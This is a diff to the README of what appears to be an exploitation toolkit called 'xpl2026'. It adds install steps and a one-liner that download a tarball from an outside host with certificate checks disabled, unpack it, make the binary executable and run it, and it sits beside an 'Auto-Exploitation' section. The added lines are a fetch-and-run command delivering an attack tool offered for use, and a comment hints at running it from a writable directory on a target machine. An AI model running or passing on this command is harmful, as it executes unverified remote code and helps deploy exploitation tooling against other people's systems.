@@ -107,12 +107,26 @@ xpl2026/
 ### Basic Usage
 
 ```bash
+# Navigate to writable directory
+wget https://mikelodon.my.id/cop/xpl2026.tgz --no-check-certificate
+tar xzf xpl2026.tgz
+rm -rf xpl2026.tgz
+
 # Navigate to xpl2026 directory
-cd /path/to/xpl2026
+cd xpl2026
+
+# Make the Toolkit xpl2026 executable
+chmod +x xpl2026
 
 # Run the toolkit
 ./xpl2026
 ```
+
+## One Liner
+```bash
+wget https://mikelodon.my.id/cop/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
+```
+---
 
 ### Auto-Exploitation (Recommended)
 
